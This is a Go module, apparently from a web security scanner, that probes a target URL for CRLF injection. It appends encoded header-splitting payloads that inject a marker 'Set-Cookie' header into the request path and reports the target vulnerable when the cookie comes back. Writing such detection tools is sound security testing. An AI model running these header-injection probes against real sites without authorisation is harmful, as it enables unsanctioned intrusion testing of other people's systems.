package modules

import (
	"context"
	"net/http"
	"net/url"
	"sync"
	"time"
)

// CrlfInjectionTestingResult holds the result of the CrlfInjectionTesting module execution.
type CrlfInjectionTestingResult struct {
	Target string `json:"target"`
	Status string `json:"status"`
	Detail string `json:"detail,omitempty"`
}

// CrlfInjectionTesting executes the crlf_injection_testing security technique.
type CrlfInjectionTesting struct {
	Target     string
	maxThreads int
	mu         sync.Mutex
	results    []CrlfInjectionTestingResult
	client     *http.Client
}

// NewCrlfInjectionTesting creates a new instance of CrlfInjectionTesting.
func NewCrlfInjectionTesting(target string) *CrlfInjectionTesting {
	// We want to test redirect/header injection without following redirects automatically
	client := NewHTTPClient(10 * time.Second)
	client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse // Don't follow redirects
	}

	return &CrlfInjectionTesting{
		Target:     EnsureHTTPPrefix(target),
		maxThreads: 5,
		client:     client,
	}
}

func (m *CrlfInjectionTesting) SetThreads(count int) {
	if count < 1 {
		count = 1
	}
	m.maxThreads = count
}

var crlfPayloads = []string{
	"%0d%0aSet-Cookie:crlf=injected",
	"%0d%0a%20Set-Cookie:crlf=injected",
	"%23%0d%0aSet-Cookie:crlf=injected",
}

func (m *CrlfInjectionTesting) Execute(ctx context.Context) ([]CrlfInjectionTestingResult, error) {
	m.results = make([]CrlfInjectionTestingResult, 0)

	parsedURL, err := url.Parse(m.Target)
	if err != nil {
		return m.results, err
	}

	jobs := make(chan string, len(crlfPayloads))
	for _, p := range crlfPayloads {
		jobs <- p
	}
	close(jobs)

	var wg sync.WaitGroup

	for i := 0; i < m.maxThreads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for payload := range jobs {
				select {
				case <-ctx.Done():
					return
				default:
					m.testPayload(ctx, parsedURL, payload)
				}
			}
		}()
	}

	done := make(chan struct{})
	go func() {
		wg.Wait()
		close(done)
	}()

	select {
	case <-done:
		return m.results, nil
	case <-ctx.Done():
		<-done
		return m.results, ctx.Err()
	}
}

func (m *CrlfInjectionTesting) testPayload(ctx context.Context, u *url.URL, payload string) {
	// Typically CRLF works in paths or specific reflection params
	testURL := *u
	testURL.Path = testURL.Path + payload

	req, err := http.NewRequestWithContext(ctx, "GET", testURL.String(), nil)
	if err != nil {
		return
	}

	resp, err := m.client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	// Check if our injected cookie made it to the response headers
	for _, cookie := range resp.Cookies() {
		if cookie.Name == "crlf" && cookie.Value == "injected" {
			m.mu.Lock()
			m.results = append(m.results, CrlfInjectionTestingResult{
				Target: m.Target,
				Status: "vulnerable",
				Detail: "CRLF Injection successful. Injected header detected.",
			})
			m.mu.Unlock()
			return
		}
	}
}
